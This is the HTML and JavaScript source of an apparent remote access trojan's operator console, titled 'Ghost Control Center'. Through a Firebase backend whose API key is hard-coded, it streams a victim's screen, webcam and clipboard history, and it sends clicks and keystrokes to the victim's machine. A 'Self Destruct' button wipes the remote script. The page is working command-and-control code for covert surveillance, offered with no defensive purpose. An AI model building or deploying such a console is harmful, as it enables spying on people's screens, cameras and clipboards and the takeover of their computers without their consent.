<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CloudStream Final Control</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .live-indicator { animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
        #remote-cursor { transition: all 0.1s ease-out; pointer-events: none; z-index: 50; }
        .key-btn { @apply bg-slate-700 hover:bg-slate-600 active:bg-slate-500 px-4 py-2 rounded text-xs font-bold border border-slate-600 shadow-sm transition-all; }
        .clipboard-item { @apply bg-slate-800 p-2 rounded text-[11px] border-l-2 border-blue-500 break-all relative group animate-in fade-in slide-in-from-right-2 duration-300; }
        .destruct-btn { @apply bg-red-900/30 hover:bg-red-600 text-red-500 hover:text-white border border-red-900/50 px-3 py-1.5 rounded text-[10px] font-black uppercase tracking-tighter transition-all; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
    </style>
</head>
<body class="bg-slate-900 text-white min-h-screen flex flex-col overflow-hidden">

    <!-- Header -->
    <header class="p-4 bg-slate-800 border-b border-slate-700 flex justify-between items-center shrink-0">
        <div class="flex items-center gap-4">
            <h1 class="font-bold text-lg flex items-center gap-2">
                <span class="bg-red-600 p-1.5 rounded shadow-lg">💻</span> 
                <span class="hidden sm:inline">Ghost Control Center</span>
            </h1>
            <button id="kill-switch" class="destruct-btn">Self Destruct</button>
        </div>
        <div class="flex items-center gap-2 px-3 py-1 rounded-full bg-slate-950 border border-slate-700 text-[10px]">
            <span class="text-slate-500 uppercase">Cam Status:</span>
            <span id="cam-status" class="text-blue-400 font-bold">Waiting...</span>
        </div>
    </header>

    <main class="flex-1 flex flex-col md:flex-row overflow-hidden">
        <!-- Main Screen -->
        <div class="flex-[3] relative bg-black flex flex-col items-center justify-center p-2 overflow-hidden">
            <div id="screen-container" class="relative max-w-full max-h-full border border-slate-800 shadow-2xl cursor-crosshair">
                <img id="stream-img" src="" class="hidden max-w-full max-h-[85vh] block" draggable="false">
                <div id="remote-cursor" class="absolute w-5 h-5 hidden">
                    <svg viewBox="0 0 24 24" fill="white" stroke="black" stroke-width="1.5"><path d="M3 3l7.07 16.97 2.51-7.39 7.39-2.51L3 3z"/></svg>
                </div>
            </div>

            <!-- Floating Camera Feed -->
            <div class="absolute bottom-4 right-4 w-48 aspect-video bg-slate-800 border-2 border-slate-700 rounded-lg shadow-2xl overflow-hidden group">
                <div class="absolute inset-0 flex items-center justify-center text-[10px] text-slate-500 font-mono" id="cam-placeholder">CAM OFF</div>
                <img id="cam-img" src="" class="absolute inset-0 w-full h-full object-cover hidden">
                <div class="absolute top-1 left-1 bg-black/60 px-1.5 py-0.5 rounded text-[8px] font-bold">REC</div>
            </div>
        </div>

        <!-- Sidebar -->
        <div class="flex-1 bg-slate-800 border-l border-slate-700 p-4 flex flex-col gap-4 overflow-y-auto shrink-0 md:w-80">
            <div class="bg-slate-900 rounded-xl p-4 border border-slate-700 shadow-inner">
                <h3 class="text-[10px] font-black text-blue-400 uppercase tracking-widest mb-3">📋 Clipboard History</h3>
                <div id="clipboard-list" class="flex flex-col gap-2 max-h-48 overflow-y-auto pr-1"></div>
            </div>

            <div class="bg-slate-900 rounded-xl p-4 border border-slate-700 shadow-inner">
                <h3 class="text-[10px] font-black text-green-400 uppercase tracking-widest mb-3">⌨️ Remote Typing</h3>
                <div class="flex flex-col gap-3">
                    <div class="relative">
                        <input type="text" id="keyboard-input" autocomplete="off" placeholder="Type here..." 
                            class="w-full bg-slate-800 border border-slate-700 rounded-lg p-2.5 text-sm outline-none focus:border-blue-500">
                        <button id="send-btn" class="absolute right-1.5 top-1.5 bg-blue-600 hover:bg-blue-500 px-3 py-1 rounded text-[10px] font-bold">SEND</button>
                    </div>
                    <div class="grid grid-cols-3 gap-2">
                        <button onclick="sendSpecialKey('enter')" class="key-btn">Enter</button>
                        <button onclick="sendSpecialKey('backspace')" class="key-btn">Del</button>
                        <button onclick="sendSpecialKey('esc')" class="key-btn">Esc</button>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
        import { getFirestore, doc, onSnapshot, collection, addDoc, serverTimestamp, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";

        const firebaseConfig = { 
            apiKey: "AIzaSyDYbGLAXKaY9uVyNPDCS-bvxsQvPWiLouk", 
            authDomain: "sainfoxiya-com-a7733.firebaseapp.com", 
            projectId: "sainfoxiya-com-a7733", 
            appId: "1:639762867502:web:826662477ce123110fc6bf" 
        };

        const appId = "sainfoxiya-com-a7733";
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        const streamImg = document.getElementById('stream-img');
        const camImg = document.getElementById('cam-img');
        const camStatus = document.getElementById('cam-status');
        const screenContainer = document.getElementById('screen-container');
        const remoteCursor = document.getElementById('remote-cursor');
        const keyboardInput = document.getElementById('keyboard-input');

        signInAnonymously(auth);
        onAuthStateChanged(auth, (user) => { if(user) initSync(); });

        async function sendAction(data) {
            await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'actions'), { 
                ...data, timestamp: serverTimestamp(), processed: false 
            });
        }

        document.getElementById('kill-switch').onclick = () => {
            if(confirm("Permanently wipe script?")) sendAction({ type: 'self_destruct' });
        };

        screenContainer.addEventListener('click', (e) => {
            const rect = screenContainer.getBoundingClientRect();
            sendAction({ type: 'click', relX: (e.clientX - rect.left)/rect.width, relY: (e.clientY - rect.top)/rect.height });
        });

        window.sendSpecialKey = (key) => sendAction({ type: 'special_key', value: key });
        document.getElementById('send-btn').onclick = () => {
            sendAction({ type: 'text', value: keyboardInput.value });
            keyboardInput.value = '';
        };

        function initSync() {
            // Screen Sync
            onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_screen'), (snap) => {
                if(snap.exists()){
                    const d = snap.data();
                    streamImg.src = d.frame;
                    streamImg.classList.remove('hidden');
                    remoteCursor.style.left = (d.cursorX * 100) + '%';
                    remoteCursor.style.top = (d.cursorY * 100) + '%';
                    remoteCursor.classList.remove('hidden');
                }
            });

            // Camera Sync
            onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_camera'), (snap) => {
                if(snap.exists()){
                    const d = snap.data();
                    camStatus.innerText = d.status;
                    if(d.frame) {
                        camImg.src = d.frame;
                        camImg.classList.remove('hidden');
                    } else {
                        camImg.classList.add('hidden');
                    }
                    if(d.motion) camStatus.className = "text-red-500 font-black animate-pulse";
                }
            });

            // Clipboard
            const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'clipboard'), orderBy('timestamp', 'desc'), limit(5));
            onSnapshot(q, (snap) => {
                const list = document.getElementById('clipboard-list');
                list.innerHTML = '';
                snap.forEach(s => {
                    const item = document.createElement('div');
                    item.className = 'clipboard-item';
                    item.innerText = s.data().text;
                    list.appendChild(item);
                });
            });
        }
    </script>
</body>
</html>
